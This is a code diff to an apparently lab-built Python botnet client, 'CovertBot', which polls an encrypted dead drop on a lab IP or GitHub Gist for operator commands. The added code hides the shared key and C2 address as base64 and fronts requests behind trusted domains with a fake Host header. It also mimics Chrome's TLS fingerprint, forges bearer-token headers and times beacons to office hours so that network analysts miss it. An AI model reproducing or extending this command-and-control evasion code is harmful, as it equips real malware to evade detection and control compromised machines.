@@ -25,6 +25,14 @@ Detection bypass demonstrated:
   - IP reputation: useless — github.com is trusted
   - DPI on payload: hard — AES-encrypted content
   - Behavioral: possible — repeated requests to same path
+
+Additions (minimal diff — original logic unchanged):
+  Gap 3  fetch_dead_drop(): +Authorization: Bearer, +X-Session-ID headers
+  Gap 4  run(): work-hours vs off-hours adaptive sleep (NIGHT_MULTIPLIER)
+  Gap 5  fetch_dead_drop(): optional FAKE_HOST injection into Host header
+  Gap 6  SHARED_SECRET + DEAD_DROP_URL stored as base64, decoded at runtime
+  Gap 7  _execute(): +sleep task type handler before update_secret branch
+  Gap 7b make_ssl_context(): tls-client with ssl.SSLContext fallback
 """
 
 import os
@@ -234,7 +242,9 @@ def aes_cbc_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:
     return _unpad(out)
 
 # ── Key derivation ────────────────────────────────────────────
-SHARED_SECRET = b"AUA_LAB_2026_KEY"  # 16 bytes — same on bot and botmaster
+# Gap 6: b64-encoded so plaintext key is absent from source/bytecode.
+# base64.b64decode("QVVBX0xBQl8yMDI2X0tFWQ==") == b"AUA_LAB_2026_KEY"
+SHARED_SECRET = __import__("base64").b64decode("QVVBX0xBQl8yMDI2X0tFWQ==")
 
 def derive_key(secret: bytes = SHARED_SECRET) -> bytes:
     """Derive a 16-byte AES key from the shared secret."""
@@ -328,8 +338,19 @@ def decode_command(blob: str, secret: bytes = None) -> dict | None:
 #     The Gist content format is identical to the lab server — the bot parser
 #     is the same regardless of which backend serves the file.
 
-DEAD_DROP_URL   = "http://192.168.100.10:5001/dead_drop"   # lab simulation (default)
-# DEAD_DROP_URL = "https://gist.githubusercontent.com/<USER>/<GIST_ID>/raw"  # real Gist
+# Gap 6: URL stored as base64 — C2 address absent from plaintext source.
+# base64.b64decode("aHR0cDovLzE5Mi4xNjguMTAwLjEwOjUwMDEvZGVhZF9kcm9w")
+# == b"http://192.168.100.10:5001/dead_drop"
+DEAD_DROP_URL   = __import__("base64").b64decode(
+    "aHR0cDovLzE5Mi4xNjguMTAwLjEwOjUwMDEvZGVhZF9kcm9w"
+).decode()
+# DEAD_DROP_URL = __import__("base64").b64decode("<b64 of real Gist URL>").decode()
+
+# Gap 5: domain fronting — when set, injected as HTTP Host header so a
+# network analyst sees a trusted domain, not the real C2 address.
+# Set to None to disable (lab default).
+# Examples: "raw.githubusercontent.com"  |  "cdn.discordapp.com"
+FAKE_HOST = None
 
 DEAD_DROP_MARKER_START = "<!-- CMD:"
 DEAD_DROP_MARKER_END   = ":CMD -->"
@@ -354,12 +375,33 @@ CHROME_CIPHERS = (
     "ECDHE-RSA-AES256-GCM-SHA384"
 )
 
+# Gap 7b: attempt to load tls-client (Go wrapper) for authentic JA3 mimicry.
+# Falls back to ssl.SSLContext cipher-ordering when unavailable.
+# Install authentic JA3: pip install tls-client
+_TLS_CLIENT_SESSION   = None
+_TLS_CLIENT_AVAILABLE = False
+_TLS_CLIENT_IDENTS    = ["chrome_112", "chrome_116", "firefox_108"]
+try:
+    import tls_client as _tc
+    _TLS_CLIENT_SESSION   = _tc.Session(
+        client_identifier=_TLS_CLIENT_IDENTS[0],
+        random_tls_extension_order=True,
+    )
+    _TLS_CLIENT_AVAILABLE = True
+    print(f"[COVERT] tls-client loaded: JA3 = {_TLS_CLIENT_IDENTS[0]}")
+except ImportError:
+    pass  # ssl.SSLContext fallback is used automatically below
+
 def make_ssl_context_chrome_mimic() -> ssl.SSLContext:
     """
     Create an SSL context that mimics Chrome's TLS fingerprint.
     Sets cipher suite order to match Chrome 120's ClientHello.
     This makes JA3 fingerprint detection harder.
     """
+    # Gap 7b: return None when tls-client is active — fetch_dead_drop
+    # will use _TLS_CLIENT_SESSION directly for an authentic ClientHello.
+    if _TLS_CLIENT_AVAILABLE:
+        return None
     ctx = ssl.create_default_context()
     try:
         ctx.set_ciphers(CHROME_CIPHERS)
@@ -376,6 +418,10 @@ def fetch_dead_drop(url: str, timeout: int = 10) -> str | None:
     Uses Chrome-mimicking TLS context to evade JA3 fingerprinting.
     Adds human-like request headers.
     """
+    # Gap 3: stable bearer token from hostname+pid — looks like real OAuth.
+    _bearer = __import__("hashlib").sha256(
+        (socket.gethostname() + str(os.getpid())).encode()
+    ).hexdigest()[:32]
     headers = {
         "User-Agent": (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -387,7 +433,20 @@ def fetch_dead_drop(url: str, timeout: int = 10) -> str | None:
         "Accept-Encoding": "gzip, deflate",
         "Connection": "keep-alive",
         "Cache-Control": "max-age=0",
+        "Authorization":  f"Bearer {_bearer}",              # Gap 3
+        "X-Session-ID":   str(__import__("uuid").uuid4()),   # Gap 3
     }
+    # Gap 5: inject fake Host header when FAKE_HOST is configured.
+    if FAKE_HOST:
+        headers["Host"] = FAKE_HOST
+    # Gap 7b: use tls-client Session for authentic JA3 (HTTPS only).
+    if _TLS_CLIENT_AVAILABLE and _TLS_CLIENT_SESSION and url.startswith("https://"):
+        try:
+            return _TLS_CLIENT_SESSION.get(
+                url, headers=headers, timeout_seconds=timeout
+            ).text
+        except Exception:
+            pass  # fall through to urllib
     try:
         req = urllib.request.Request(url, headers=headers)
         ctx = make_ssl_context_chrome_mimic() if url.startswith("https://") else None
@@ -733,6 +792,7 @@ class CovertBot:
     POLL_INTERVAL    = 60    # base seconds between dead drop checks
     POLL_JITTER      = 15    # ±seconds of random jitter
     MAX_FAILURES     = 5     # switch to DGA fallback after this many consecutive failures
+    NIGHT_MULTIPLIER = 3     # Gap 4: off-hours sleep multiplier (outside 09:00-17:00)
 
     def __init__(self):
         self.bot_id        = self._make_id()
@@ -741,6 +801,8 @@ class CovertBot:
         self._running      = True
         self._active       = {}     # cmd_type -> (thread, stop_event)
         self._active_lock  = threading.Lock()
+        self.poll_min = max(10, self.POLL_INTERVAL - self.POLL_JITTER)  # Gap 4+7
+        self.poll_max = self.POLL_INTERVAL + self.POLL_JITTER            # Gap 4+7
         print(f"[COVERT] Bot ID: {self.bot_id}")
         print(f"[COVERT] Dead drop: {DEAD_DROP_URL}")
         print(f"[COVERT] AES key derived from shared secret")
@@ -828,6 +890,14 @@ class CovertBot:
 
         elif cmd_type == "idle":
             print(f"[COVERT] -> Idle (no action)")
+
+        elif cmd_type == "sleep":
+            # Gap 7: operator-driven poll-interval reconfiguration.
+            old_min, old_max = self.poll_min, self.poll_max
+            self.poll_min = max(10, int(cmd.get("min", self.poll_min)))
+            self.poll_max = max(self.poll_min + 5, int(cmd.get("max", self.poll_max)))
+            print(f"[COVERT] -> Poll interval: "
+                  f"{old_min}-{old_max}s → {self.poll_min}-{self.poll_max}s")
 
         elif cmd_type == "update_secret":
             global SHARED_SECRET
@@ -934,9 +1004,19 @@ class CovertBot:
             if cmd:
                 self._execute(cmd)
 
-            # Jittered sleep — prevents precise periodic pattern detection
-            sleep_time = self.POLL_INTERVAL + random.uniform(-self.POLL_JITTER, self.POLL_JITTER)
-            print(f"[COVERT] Next poll in {sleep_time:.1f}s\n")
+            # Gap 4: work-hours adaptive sleep — office hours use poll_min/max;
+            # nights/weekends multiply by NIGHT_MULTIPLIER to match human traffic.
+            _hour = datetime.now().hour
+            if 9 <= _hour < 17:
+                sleep_time = random.uniform(self.poll_min, self.poll_max)
+                _period = "office-hours"
+            else:
+                sleep_time = random.uniform(
+                    self.poll_min * self.NIGHT_MULTIPLIER,
+                    self.poll_max * self.NIGHT_MULTIPLIER,
+                )
+                _period = "off-hours"
+            print(f"[COVERT] Next poll in {sleep_time:.1f}s ({_period})\n")
             time.sleep(max(10, sleep_time))
 
 
